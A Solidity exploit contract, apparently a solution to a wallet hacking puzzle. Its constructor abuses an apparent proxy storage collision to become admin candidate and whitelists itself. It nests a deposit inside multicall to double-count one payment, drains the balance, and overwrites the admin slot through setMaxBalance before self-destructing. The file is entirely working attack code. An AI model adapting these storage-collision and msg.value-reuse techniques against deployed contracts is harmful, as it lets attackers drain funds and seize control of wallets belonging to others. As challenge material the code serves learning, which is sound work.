// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

interface IPuzzle {
    function admin() external view returns (address);
    function proposeNewAdmin(address _newAdmin) external;
    function setMaxBalance(uint256 _maxBalance) external;
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function multicall(bytes[] calldata data) external payable;
}

contract PuzzleWalletHack {
    error HackFailed();

    IPuzzle private immutable TARGET;

    constructor(address payable _target) payable {
        TARGET = IPuzzle(_target);
        TARGET.proposeNewAdmin(address(this));
        TARGET.addToWhitelist(address(this));
        bytes[] memory depositData = new bytes[](1);
        depositData[0] = abi.encodeWithSelector(TARGET.deposit.selector);
        bytes[] memory data = new bytes[](2);
        data[0] = depositData[0];
        data[1] = abi.encodeWithSelector(TARGET.multicall.selector, depositData);
        TARGET.multicall{value: 0.001 ether}(data);
        TARGET.execute(msg.sender, 0.002 ether, "");
        TARGET.setMaxBalance(uint256(uint160(msg.sender)));
        if (TARGET.admin() != msg.sender) revert HackFailed();
        selfdestruct(payable(msg.sender));
    }
}
